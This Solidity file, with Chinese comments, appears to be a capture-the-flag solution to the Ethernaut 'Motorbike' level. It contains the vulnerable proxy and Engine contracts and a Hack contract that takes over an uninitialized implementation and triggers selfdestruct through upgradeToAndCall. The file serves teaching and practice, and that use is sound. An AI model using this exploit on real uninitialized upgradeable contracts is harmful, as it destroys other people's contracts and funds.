// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

/**
 * 1、题目分析：selfdesctruct the engine
 * 1）Motorbike 合约是一个可升级的代理合约，使用了 EIP-1967 的代理模式来实现升级功能,储存了实现合约的地址 _IMPLEMENTATION_SLOT
 *    - 1）通过委托调用(delegatecall)的方式，将当前的调用委托给实现合约。
 *    - 2）Address.isContract() 是一个内置函数，用于检查给定地址是否是一个合约地址。
          Address.isContract(_logic),
        3）getAddressSlot() 是一个函数，它返回一个特定槽位的引用。将 _logic 地址存储在 _IMPLEMENTATION_SLOT 槽位
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
 * 2）Engine 合约是 Motorbike 合约的一个实现合约，它继承了Initializable合约，
 *    - 1）包含了一个upgrader地址和一个horsePower变量
 *    - 2）upgradeToAndCall函数用于升级代理合约的实现
 *    - 3）_setImplementation函数用于存储新的实现合约地址。
 * 
 * 2、解题思路：
 * ...................delegatecall
 * user -> Motorbike -> Engine
 * ........upgrader = oz
 * hack -> Engine
 * ........initialize() ... upgrader = hack
 * ........upgradeToAndCall(hack, kill)
 * 
 * hack ->
 * - 将 upgrader 设置为 hack 合约  -> _upgradeToAndCall(newImplementation, data) 可以调用 newImplementation 的函数，-> 将 newImplementation 也设置为 hack 合约（自毁） -> 因为在 engine 合约里使用 delegatecall 所以也会毁掉 engine 合约
 * 
 * 3、解题
 * 1）从 代理合约地址中获取实现合约的地址：await web3.eth.getStorageAt(contract.address, "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc");
 *    - 返回 implemetation contract 的地址：0x0000000000000000000000000c6abde8b07cd43254f32c6aed62c9bba98b6d4d    -> 0x0c6abde8b07cd43254f32c6aed62c9bba98b6d4d
 *    - 用这个地址部署调用 pwn 函数
 *
 *
 */

import "openzeppelin-contracts-06/utils/Address.sol";
import "openzeppelin-contracts-06/proxy/Initializable.sol";

interface IEngine {
    function initialize() external;

    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable;

    function upgrader() external view returns (address);
}

contract Hack {
    function pwn(IEngine target) external {
        // delegatecall 初始化合约使 upgrader = hack (调用者是 Motorbike, 被调用者是 Engine);
        target.initialize();
        // delegatecall 使被调用者 newimplementation (hack) 执行，更新的是调用者 Engine;
        target.upgradeToAndCall(
            address(this),
            abi.encodeWithSelector(this.kill.selector)
        );
    }

    function kill() external {
        selfdestruct(payable(address(0)));
    }
}

contract Motorbike {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    // 存储地址
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }

    // Initializes the upgradeable proxy with an initial implementation specified by `_logic`.
    constructor(address _logic) public {
        require(
            // Address.isContract() 是一个内置函数，用于检查给定地址是否是一个合约地址。
            Address.isContract(_logic),
            "ERC1967: new implementation is not a contract"
        );
        // getAddressSlot() 是一个函数，它返回一个特定槽位的引用。在这里，我们将 _logic 地址存储在 _IMPLEMENTATION_SLOT 槽位
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        // 使用 _logic 地址调用一个名为 "initialize()" 的函数
        (bool success, ) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }

    // Delegates the current call to `implementation`.
    /**
     * 在内部执行一个委托调用。它将调用数据复制到内存中，
     * 然后使用委托调用执行指定合约的代码，并根据委托调用的结果进行相应的处理。
     * 如果委托调用失败，将回滚并抛出错误；如果委托调用成功，将返回调用的结果。
     */
    function _delegate(address implementation) internal virtual {
        // solhint-disable-next-line no-inline-assembly
        // 使用内联汇编（inline assembly）来执行委托调用
        assembly {
            // 调用数据（calldata）从当前合约的调用者复制到内存中的位置0，这样被委托调用的合约可以访问调用数据。
            calldatacopy(0, 0, calldatasize())
            // 允许在当前合约的上下文中执行被调用合约的代码：mplementation 是被调用合约的地址，0 是委托调用的输入值，calldatasize() 是调用数据的大小，0 和 0 是输出值的位置和大小。
            // returndatacopy(0, 0, returndatasize())将委托调用的返回数据从内存复制到位置0，
            // case 0：如果委托调用失败（返回值为0），执行下面的代码块
            // default：如果委托调用成功（返回值不为0），执行下面的代码块
            // return(0, returndatasize()) 将委托调用的返回数据作为函数的返回值
            let result := delegatecall(
                gas(),
                implementation,
                0,
                calldatasize(),
                0,
                0
            )
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }

    // Fallback function that delegates calls to the address returned by `_implementation()`.
    // Will run if no other function in the contract matches the call data
    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }

    // Returns an `AddressSlot` with member `value` located at `slot`.
    function _getAddressSlot(
        bytes32 slot
    ) internal pure returns (AddressSlot storage r) {
        // 接受一个 bytes32 类型的参数 slot，并返回一个 AddressSlot 类型的存储引用
        //
        assembly {
            // 将指定的槽位赋值给 r_slot。
            r_slot := slot
        }
    }
}

contract Engine is Initializable {
    // keccak-256 hash of "eip1967.proxy.implementation" subtracted by 1
    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    // initialize的外部函数，用于初始化合约
    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }

    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable {
        // _authorizeUpgrade函数来检查调用者是否有权限进行升级。
        // _upgradeToAndCall函数来执行实际的升级操作。
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    // Restrict to upgrader role
    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }

    // Perform implementation upgrade with security checks for UUPS proxies, and additional setup call.
    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {
        // _setImplementation函数来设置新的实现地址。
        // Initial upgrade and setup call
        _setImplementation(newImplementation);
        // 如果传入的data参数的长度大于0，我们使用delegatecall来执行新实现地址的函数调用。
        if (data.length > 0) {
            (bool success, ) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    // Stores a new address in the EIP1967 implementation slot.
    function _setImplementation(address newImplementation) private {
        require(
            Address.isContract(newImplementation),
            "ERC1967: new implementation is not a contract"
        );

        // 声明了一个名为r的AddressSlot类型的存储变量
        // 将_IMPLEMENTATION_SLOT的值赋给r_slot变量
        // r.value来访问和修改存储在该槽位中的值。
        AddressSlot storage r;
        assembly {
            r_slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}
